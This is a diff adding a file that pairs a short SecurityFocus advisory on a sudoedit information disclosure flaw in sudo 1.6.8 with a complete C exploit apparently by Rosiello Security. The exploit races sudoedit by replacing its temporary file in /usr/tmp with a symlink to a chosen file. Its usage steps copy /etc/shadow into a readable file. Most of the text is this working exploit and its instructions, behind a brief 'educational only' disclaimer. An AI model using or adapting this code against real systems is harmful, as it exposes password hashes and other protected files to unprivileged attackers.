@@ -1,0 +1,117 @@
+source: http://www.securityfocus.com/bid/11204/info
+
+Sudo is reported prone to an information disclosure vulnerability.
+
+This vulnerability presents itself when sudo is called with the '-e' option, or the 'sudoedit' command is invoked. In certain circumstances, attackers may access the contents of arbitrary files with superuser privileges.
+
+Version 1.6.8 is reported susceptible to this vulnerability.
+
+/*
+
+           Copyright ? Rosiello Security 2004
+                http://www.rosiello.org
+
+                  sudoedit Exploit
+
+
+SOFTWARE : sudoedit
+REFERENCE: http://www.sudo.ws/sudo/alerts/sudoedit.html
+DATE: 18/09/2004
+
+Summary:
+A flaw in exists in sudo's -u option (aka sudoedit)
+in sudo version 1.6.8 that can give an attacker
+read permission to a file that would otherwise be
+unreadable.
+
+Sudo versions affected:
+1.6.8 only
+
+Credit:
+Reznic Valery discovered the problem.
+
+-----------------------------------------------------------
+
+All the information that you can find in this software
+were published for educational and didactic purpose only.
+The author published this program under the condition
+that is not in the intention of the reader to use them
+in order to bring to himself or others a profit or to bring
+to others damage.
+
+!Respect the law!
+
+How do I use this code ?
+
+To exploit sudoedit you have to open with it the
+file "rosiello" as shown in the example.
+
+EXAMPLE SCENARIO:
+
+1) Open two shells (i) and (ii);
+2) (i)$sudoedit rosiello;
+3) (ii)$./sudoedit-exploit /etc/shadow;
+4) (i) close sudoedit.
+
+The file "rosiello" is now a copy of "/etc/shadow".
+
+AUTHOR : Angelo Rosiello
+CONTACT: angelo@rosiello.org
+
+*/
+
+#include <stdio.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <dirent.h>
+
+
+int main( int argc, char *argv[] )
+{
+        char PATH[]="/usr/tmp";
+        char file[32];
+        DIR *tmp;
+        struct dirent *de;
+        tmp = opendir ( PATH );
+        int found = 0;
+
+        printf( "Copyright ?? Rosiello Security 2004\n" );
+        printf( "http://www.rosiello.org\n" );
+
+        if( argc!=2 )
+        {
+                printf( "USAGE: %s file\n", argv[0] );
+                return( 0 );
+        }
+
+
+        while ( (de = readdir ( tmp ))!= NULL )
+        {
+                if ( (strstr(de->d_name, "rosiello") != NULL) )
+                {
+                        if( strlen(de->d_name) > 24 ) return( 0 );
+                        sprintf( file, "%s/%s", PATH, (char *)de->d_name );
+                        remove( file );
+                        if( fork()!=0 )
+                        {
+                                execl( "/bin/ln", "ln", "-s", argv[1], file, NULL );
+                        }
+                        wait( );
+                        printf( "Now you can close sudoedit and reopen rosiello!\n" );
+                        found=1;
+                        goto end;
+
+                }
+
+        }
+        end:
+        closedir( tmp );
+
+        if( !found )
+                printf( "File Not Found!\n" );
+        return( 0 );
+
+}
